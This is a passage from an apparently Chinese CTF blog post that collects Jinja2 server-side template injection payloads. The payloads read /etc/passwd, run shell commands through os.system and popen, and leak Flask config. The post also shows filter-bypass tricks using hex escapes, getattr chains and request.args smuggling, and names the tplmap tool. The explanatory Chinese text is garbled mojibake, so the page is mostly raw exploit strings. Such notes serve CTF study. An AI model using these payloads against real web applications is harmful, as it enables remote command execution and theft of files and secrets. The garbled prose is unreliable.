<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<p>======================åˆ†å‰²çº¿</p>
<p><strong>å®‰æ’æ¯æŠ—ç–«æœˆèµ›</strong></p>
<p>æ²¡æ‰“æ¯”èµ›ï¼Œä¼¼ä¹æ˜¯è¿‡æ»¤äº†<code>.</code>å’Œ<code>_</code>ï¼Œ</p>
<p>æˆ‘æƒ³åˆ°çš„payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(getattr(getattr(getattr(getattr(&#39;&#39;,dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;mro&#39;+dir(0)[0][0]*2)[-1],dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[127],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;system&#39;](&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>èµ›åçœ‹åˆ°ä¸‹é¢ä¸¤ä¸ªpayload</p>
<p>payload1ï¼Œåˆ©ç”¨è½¬ä¹‰å­—ç¬¦ï¼ˆ16è¿›åˆ¶ï¼‰</p>
<blockquote>
<p><a href="http://python-ds.com/python-3-escape-sequences" target="_blank" rel="noopener">http://python-ds.com/python-3-escape-sequences</a> </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&#39;\x5f\x5fimport\x5f\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>payload2ï¼Œåˆ©ç”¨request</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤&#39;).read()</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçªç„¶æ„è¯†åˆ°æ–‡ç« å‰é¢éƒ½æ²¡æœ‰æåˆ°è¿‡æ»¤å™¨ï¼Œè€Œåœ¨æ¨¡ç‰ˆå¼•æ“ä¸­è¿‡æ»¤å™¨ä¹Ÿæœ‰å¾ˆå¤šszs</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#æ¯”å¦‚flagè¢«è¿‡æ»¤ï¼Œ|reverse</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()</span><br><span class="line">#æ¯”å¦‚getattrè¢«è¿‡æ»¤ï¼Œ|attr</span><br><span class="line">(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">#names|lastï¼Œå–åºåˆ—æœ€åä¸€ä¸ªå…ƒç´ ç­‰ç­‰</span><br></pre></td></tr></table></figure>

<p>=======================åˆ†å‰²çº¿</p>
<p>æœ‰æ—¶å€™åç«¯ä»£ç è¿‡æ»¤ä»£ç å¯èƒ½æ˜¯è¿™æ ·çš„</p>
<p><img src="https://i.loli.net/2020/03/02/zcjwfxstTpdqekr.png" alt="Snipaste_2020-03-02_10-36-51.png"></p>
<p><code>open (&#39;&#39;)</code></p>
<p>=======================åˆ†å‰²çº¿</p>
<p>åˆé€›åˆ°ä¸€ç¯‡bypassçš„æ–‡ç« </p>
<p><a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">ä»SSTIåˆ°æ²™ç®±é€ƒé€¸-jinja2</a></p>
<img src="https://i.loli.net/2020/03/06/FmYOAgdIZWf6iJ5.png" alt="Snipaste_2020-03-06_09-57-36.png" style="zoom:50%;">

<p> éœ€è¦è·å–çš„å†…å®¹åœ¨ config ä¸­ï¼Œä¸èƒ½ä½¿ç”¨<code>(ã€)ã€selfã€config</code> </p>
<p> å¯ç”¨çš„ä¸Šä¸‹æ–‡å˜é‡/å‡½æ•°å¦‚ä¸‹<br><code>url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config</code> </p>
<p>åŒæ—¶åˆ©ç”¨ä¸Šä¸‹æ–‡è·å– config æ–¹å¼å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__globals__[&#39;current_app&#39;].config&#96; &#x2F; &#96;top.app.config</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#39;current_app&#39;].config</span><br><span class="line">get_flashed_messages.__globals__[&#39;current_app&#39;].config</span><br></pre></td></tr></table></figure>

<p>============================åˆ†å‰²çº¿</p>
<blockquote>
<p>ä¸€æŠŠæ¢­ï¼š <a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a> </p>
</blockquote>
<p>============================åˆ†å‰²çº¿</p>
<hr>
<h4><span id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</span></h4><p> <a href="http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/" target="_blank" rel="noopener">http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/</a> </p>
<p> <a href="https://lihuaiqiu.github.io/2019/07/07/SSTIæ¨¡æ¿æ³¨å…¥-Jinja2/#more" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>æœ¬æ–‡ä½œè€…ï¼š</strong>
              <a href="/" title="æ¬¢è¿è®¿é—® glotozz çš„ä¸ªäººåšå®¢">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>ç‰ˆæƒå£°æ˜ï¼š </strong>
               æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ CC BY-NC-SA 4.0 è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">JavaScriptåŸå‹é“¾æ±¡æŸ“</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/02/23/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-3/">
        <span class="next-text nav-default">2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- ä»£ç å—å¤åˆ¶åŠŸèƒ½ -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
